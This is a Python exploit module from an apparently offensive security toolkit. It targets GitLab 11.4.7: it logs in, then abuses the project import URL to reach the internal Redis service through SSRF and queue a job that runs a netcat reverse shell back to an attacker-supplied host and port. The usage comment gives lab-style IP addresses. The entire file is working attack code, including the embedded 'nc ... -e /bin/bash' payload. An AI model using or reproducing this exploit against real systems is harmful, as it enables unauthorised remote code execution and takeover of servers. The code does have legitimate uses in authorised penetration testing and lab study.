from rmsectkf.core.modules.remote.exploit.web.web_module import WebModule
import requests
from bs4 import BeautifulSoup
import random

# rm-sec-toolkit -m remote/exploit/web/gitlab_11_4_7_remote_code --rhosts 10.10.10.220 --rports 5080 --user john --password Testpassw1! --lhost 10.10.14.53 --lport 5555

'''
With the help of
https://github.com/ctrlsam/GitLab-11.4.7-RCE
'''


class Exploit(WebModule):
    def __init__(self):
        WebModule.__init__(self)
        self.option_user = self.option_handler.create_option("user", "username for gitlab", required=True)
        self.option_password = self.option_handler.create_option("password", "password for gitlab", required=True)

    def init_module(self):
        self.option_rhosts.needs_value = True
        self.option_rhosts.required = True
        self.option_rhosts.value = []
        pass

    def lpart_exists(self):
        return True

    def run_module(self):
        if super().run_module() == False:
            return False

        gitlab_url = "http://{}:{}".format(self.option_rhosts.value[0], self.option_rports.value[0])
        session = requests.Session()

        print("fetch token for login")
        r_sign_in = session.get(gitlab_url + "/users/sign_in")
        soup = BeautifulSoup(r_sign_in.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")

        print("token found: {}".format(token))

        print("do login")
        data = {
            "authenticity_token": token,
            "user[login]": self.option_user.value,
            "user[password]": self.option_password.value,
            "user[remember_me]": "0"
        }

        r_sign_in = session.post(gitlab_url + "/users/sign_in", data=data)

        if r_sign_in.status_code != 200:
            print("Login Error!")
            return

        print("login was successful")

        # git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git
        import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
        pr_name = "pr{}".format(random.randrange(1, 100000))
        pr_url = "{}/{}".format(gitlab_url, self.option_user.value)

        print("create project: {}".format(pr_name))

        form = """\nmulti
            sadd resque:gitlab:queues system_hook_push
            lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {self.option_lhost.value} {self.option_lport.value} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
            exec
            exec
            exec\n"""

        r = session.get(f"{gitlab_url}/projects/new")

        soup = BeautifulSoup(r.text, features="lxml")

        namespace_id = soup.find(
            'input', {'name': 'project[namespace_id]'}).get('value')

        project_token = soup.findAll('meta')[16].get("content")
        project_token = project_token.replace("==", "%3D%3D")
        project_token = project_token.replace("+", "%2B")

        payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={import_url}{form}&project%5Bci_cd_only%5D=false&project%5Bname%5D={pr_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={pr_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"

        cookies = {
            'sidebar_collapsed': 'false',
            'event_filter': 'all',
            'hide_auto_devops_implicitly_enabled_banner_1': 'false',
            '_gitlab_session': session.cookies['_gitlab_session'],
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': f'{gitlab_url}/projects',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '398',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }

        print("[+] Running Exploit")
        r = session.post(
            gitlab_url + '/projects', data=payload, cookies=cookies, headers=headers, verify=False)
        if "The change you requested was rejected." in r.text:
            exit('Exploit failed, check input params')

        print('[+] Exploit completed successfully!')


def get_module():
    return Exploit()
